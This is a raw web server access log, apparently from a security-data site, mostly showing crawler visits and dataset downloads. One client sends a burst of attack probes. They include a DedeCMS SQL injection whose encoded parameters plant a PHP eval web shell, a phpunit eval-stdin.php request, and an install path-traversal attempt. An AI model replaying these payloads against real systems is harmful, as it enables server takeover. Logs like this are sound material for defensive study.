54.36.148.237 - - [02/Dec/2018:02:18:52 -0800] "GET /self.logs/error.log.2016-07-09.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
220.243.135.176 - - [02/Dec/2018:14:23:42 -0800] "GET /self.logs/access.log.2017-11-13.gz HTTP/1.1" 200 28184 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4058.857 Mobile Safari/537.36" 
[phone].192 - - [02/Dec/2018:14:23:44 -0800] "GET /self.logs/access.log.2017-12-18.gz HTTP/1.1" 200 22639 "-" "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.4589.857 Mobile Safari/537.36" 
[phone].93 - - [02/Dec/2018:14:23:45 -0800] "GET /self.logs/error.log.2018-10-30.gz HTTP/1.1" 200 4372 "-" "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.7283.877 Mobile Safari/537.36" 
117.40.196.68 - - [02/Dec/2018:14:28:24 -0800] "GET //plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:24 -0800] "GET //plus/ad_js.php?aid=19 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:25 -0800] "GET //plus/read.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:25 -0800] "POST //include/dialog/select_soft_post.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:26 -0800] "GET //data/cache/asd.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:27 -0800] "GET //install/index.php.bak?step=11&insLockfile=a&s_lang=x&install_demo_name=../data/admin/config_update.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:27 -0800] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:28 -0800] "GET //vendor/phpunit/phpunit/src/Util/PHP/asd.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:28 -0800] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
117.40.196.68 - - [02/Dec/2018:14:28:29 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
54.36.148.241 - - [02/Dec/2018:14:28:38 -0800] "GET /self.logs/error.log.2016-09-30.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
46.161.27.210 - - [02/Dec/2018:14:31:59 -0800] "HEAD /maccdc2012/ssl.log.gz HTTP/1.1" 200 299 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94" 
46.161.27.210 - - [02/Dec/2018:14:32:00 -0800] "HEAD /maccdc2012/ssl.log.gz HTTP/1.1" 200 299 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94" 
162.210.196.98 - - [02/Dec/2018:14:32:01 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [02/Dec/2018:14:32:02 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [02/Dec/2018:14:32:03 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [02/Dec/2018:14:32:05 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [02/Dec/2018:14:32:06 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [02/Dec/2018:14:32:08 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:35:17 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:35:21 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:35:34 -0800] "GET /%C2%A0%C2%A0 HTTP/1.1" 301 450 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:35:43 -0800] "GET /%C3%82%C2%A0%C3%82 HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:35:50 -0800] "GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:36:23 -0800] "GET /honeypot//%22http://glastopf.org//%22 HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:36:51 -0800] "GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:37:23 -0800] "GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:37:37 -0800] "GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
89.221.216.62 - - [02/Dec/2018:14:37:49 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
18.219.24.122 - - [02/Dec/2018:14:44:38 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
3.17.28.84 - - [02/Dec/2018:14:45:34 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
18.223.16.33 - - [02/Dec/2018:14:45:52 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0" 
54.36.148.34 - - [02/Dec/2018:14:45:59 -0800] "GET /self.logs/2016/access.log.2016-02-27.gz HTTP/1.1" 200 10831 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
36.110.192.221 - - [02/Dec/2018:14:48:06 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.149.104 - - [02/Dec/2018:14:49:20 -0800] "GET /self.logs/2015/error.log.2015-12-29.gz HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.226 - - [02/Dec/2018:14:49:21 -0800] "GET /self.logs/error.log.2017-11-01.gz HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
52.53.201.78 - - [02/Dec/2018:14:52:26 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
54.36.148.18 - - [02/Dec/2018:14:59:59 -0800] "GET /self.logs/access.log.2018-03-17.gz HTTP/1.1" 200 28089 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
85.133.130.131 - - [02/Dec/2018:15:00:28 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36" 
207.46.13.192 - - [02/Dec/2018:15:03:41 -0800] "GET /self.logs/error.log.2016-11-08.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.17 - - [02/Dec/2018:15:13:54 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
3.16.165.99 - - [02/Dec/2018:15:15:23 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
3.17.23.107 - - [02/Dec/2018:15:15:23 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/42.0" 
3.16.83.119 - - [02/Dec/2018:15:15:36 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
113.171.224.176 - - [02/Dec/2018:15:15:47 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
185.255.96.99 - - [02/Dec/2018:15:16:03 -0800] "GET / HTTP/1.0" 200 46413 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.99" 
54.36.148.30 - - [02/Dec/2018:15:17:48 -0800] "GET /self.logs/error.log.2017-07-25.gz HTTP/1.1" 200 1397 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.199 - - [02/Dec/2018:15:30:21 -0800] "GET /self.logs/2016/access.log.2016-09-22.gz HTTP/1.1" 200 8022 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.144 - - [02/Dec/2018:15:33:22 -0800] "GET /self.logs/error.log.2017-03-21.gz HTTP/1.1" 200 1009 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
41.223.160.138 - - [02/Dec/2018:15:36:20 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
93.124.12.226 - - [02/Dec/2018:15:37:24 -0800] "GET / HTTP/1.1" 418 695 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
54.36.148.60 - - [02/Dec/2018:15:39:12 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/ftp.html HTTP/1.1" 200 1603 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
41.223.160.138 - - [02/Dec/2018:15:41:08 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.226 - - [02/Dec/2018:15:41:46 -0800] "GET /self.logs/error.log.2015-05-08.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
3.16.57.61 - - [02/Dec/2018:15:45:20 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
13.58.1.116 - - [02/Dec/2018:15:45:47 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Safari/602.1" 
3.16.162.51 - - [02/Dec/2018:15:46:47 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Safari/602.1" 
40.77.167.68 - - [02/Dec/2018:15:54:01 -0800] "GET /self.logs/error.log.2017-09-15.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
95.105.170.6 - - [02/Dec/2018:16:00:38 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
97.88.5.214 - - [02/Dec/2018:16:01:11 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
97.88.5.214 - - [02/Dec/2018:16:01:50 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
97.88.5.214 - - [02/Dec/2018:16:01:51 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
97.88.5.214 - - [02/Dec/2018:16:01:56 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
54.36.148.19 - - [02/Dec/2018:16:06:53 -0800] "GET /self.logs/access.log.2017-11-24.gz HTTP/1.1" 200 23105 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
40.77.167.68 - - [02/Dec/2018:16:12:18 -0800] "GET /self.logs/access.log.2017-08-28.gz HTTP/1.1" 200 23339 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
3.16.83.119 - - [02/Dec/2018:16:14:38 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
3.17.5.197 - - [02/Dec/2018:16:16:48 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/42.0" 
18.224.183.230 - - [02/Dec/2018:16:18:05 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" 
113.171.224.176 - - [02/Dec/2018:16:21:18 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.243 - - [02/Dec/2018:16:21:46 -0800] "GET /self.logs/error.log.2017-10-11.gz HTTP/1.1" 200 2064 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
5.188.210.59 - - [02/Dec/2018:16:22:22 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.54" 
54.36.148.58 - - [02/Dec/2018:16:24:52 -0800] "GET /self.logs/access.log.2018-03-27.gz HTTP/1.1" 200 34415 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.226 - - [02/Dec/2018:16:27:23 -0800] "GET /self.logs/error.log.2017-09-02.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.58.86.209 - - [02/Dec/2018:16:32:46 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.209 - - [02/Dec/2018:16:32:49 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.148.40 - - [02/Dec/2018:16:33:25 -0800] "GET /self.logs/2015/access.log.2015-12-05.gz HTTP/1.1" 200 5314 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
209.15.209.89 - - [02/Dec/2018:16:39:57 -0800] "HEAD / HTTP/1.1" 200 239 "-" "-" 
98.227.248.129 - - [02/Dec/2018:16:39:58 -0800] "GET / HTTP/1.1" 200 12470 "https://www.researchgate.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
98.227.248.129 - - [02/Dec/2018:16:39:58 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
98.227.248.129 - - [02/Dec/2018:16:39:58 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
98.227.248.129 - - [02/Dec/2018:16:40:00 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
100.43.91.201 - - [02/Dec/2018:16:40:37 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.91.201 - - [02/Dec/2018:16:40:41 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
207.46.13.192 - - [02/Dec/2018:16:41:24 -0800] "GET /self.logs/error.log.2017-06-21.gz HTTP/1.1" 200 934 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
3.17.77.122 - - [02/Dec/2018:16:45:28 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" 
3.16.138.56 - - [02/Dec/2018:16:47:18 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Firefox/42.0" 
207.237.144.42 - - [02/Dec/2018:16:47:28 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
207.237.144.42 - - [02/Dec/2018:16:47:28 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
207.237.144.42 - - [02/Dec/2018:16:47:28 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
207.237.144.42 - - [02/Dec/2018:16:47:29 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
18.217.252.244 - - [02/Dec/2018:16:49:11 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
54.36.148.177 - - [02/Dec/2018:16:53:29 -0800] "GET /self.logs/2016/access.log.2016-05-19.gz HTTP/1.1" 200 10147 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
40.77.167.68 - - [02/Dec/2018:16:55:26 -0800] "GET /self.logs/error.log.2015-11-21.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.82 - - [02/Dec/2018:16:57:29 -0800] "GET /self.logs/access.log.2016-11-07.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.149.11 - - [02/Dec/2018:16:59:58 -0800] "GET /self.logs/access.log.2016-12-15.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
106.38.121.194 - - [02/Dec/2018:17:04:11 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
40.77.167.68 - - [02/Dec/2018:17:07:57 -0800] "GET /self.logs/error.log.2017-04-11.gz HTTP/1.1" 200 739 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
79.74.187.41 - - [02/Dec/2018:17:08:50 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.87 - - [02/Dec/2018:17:09:05 -0800] "GET /self.logs/error.log.2016-02-20.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
